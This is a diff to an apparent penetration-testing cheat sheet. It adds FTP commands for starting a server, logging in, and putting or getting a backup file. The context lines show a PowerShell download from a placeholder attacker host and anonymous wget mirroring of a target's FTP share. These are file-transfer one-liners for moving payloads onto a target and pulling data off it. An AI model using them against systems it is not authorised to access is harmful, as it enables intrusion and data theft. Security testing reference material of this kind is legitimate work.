@@ -523,7 +523,8 @@ powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfil
 
 ##### FTP
 ```cmd
-python -m pyftpdlib -p 21 -w	// To start the ftp server on port 21
+python -m pyftpdlib -p 21 -w	\\ To start the ftp server on port 21
+ftp <RHOST>			\\ To login to the ftp server
 ```
 
 ##### Bash only
@@ -600,6 +601,9 @@ ftp -A <RHOST>
 wget -m ftp://anonymous:anonymous@<RHOST>		\\  Mirror mode
 wget -r ftp://anonymous:anonymous@<RHOST>
 wget -r --user="USERNAME" --password="PASSWORD" ftp://<RHOST>/
+lcd /opt/backup						\\ To change the local path to /opt/backup
+put sitebackup1.zip					\\ To upload the file.
+get sitebackup1.zip					\\ TO download the file.
 ```
 
 #### Kerberos
